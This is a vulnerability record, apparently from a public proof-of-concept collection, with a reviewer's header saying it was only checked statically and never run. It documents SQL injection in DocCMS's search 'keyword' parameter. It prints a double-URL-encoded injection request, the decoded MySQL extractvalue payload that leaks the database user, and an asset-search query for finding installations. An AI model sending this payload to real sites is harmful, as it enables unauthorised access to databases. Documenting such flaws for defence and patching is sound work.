---
version: "unknown"
source: "Threekiii/Awesome-POC"
product: "DocCMS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "DocCMS keyword SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Unspecified version; public search keyword; double decoding; MySQL extractvalue support/error display"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-40e5ca7a7f87e7b2f76a357b"
entity_id: "ve-40e5ca7a7f87e7b2f76a357b"
schema_version: "1"
previous_version: "DocCMS"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Unspecified version; public search keyword; double decoding; MySQL extractvalue support/error display

- **事实待核（1）**：Version metadata is product name, not version。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（2）**：Payload and decoded form coherent but decoding path/source code absent。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **事实待核（3）**：No auth/fixed-version/original advisory; secondary repo only。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# DocCMS keyword SQL注入漏洞

> 版本字段校订（2026-10-04）：误填的版本字段原值逐字保存到对应 `previous_*` 字段。当前值区分正文声称的影响范围、实验环境与尚未知的范围；后文对该元数据误填的旧说明只描述校订前状态，未据此升级来源结论。

## 漏洞描述

DocCMS keyword参数存在 SQL注入漏洞，攻击者通过漏洞可以获取数据库信息

## 漏洞影响

```
DocCMS
```

## 网络测绘

```
app="Doccms"
```

## 漏洞复现

CMS官网

![](./.resource/DocCMSkeywordSQL注入漏洞/media/202202170903272.png)

验证POC

```plain
/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33
```

![](./.resource/DocCMSkeywordSQL注入漏洞/media/202202170903242.png)

其中payload为下列语句的二次Url编码

```plain
' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#
```


---

> 来源：Threekiii/Awesome-POC
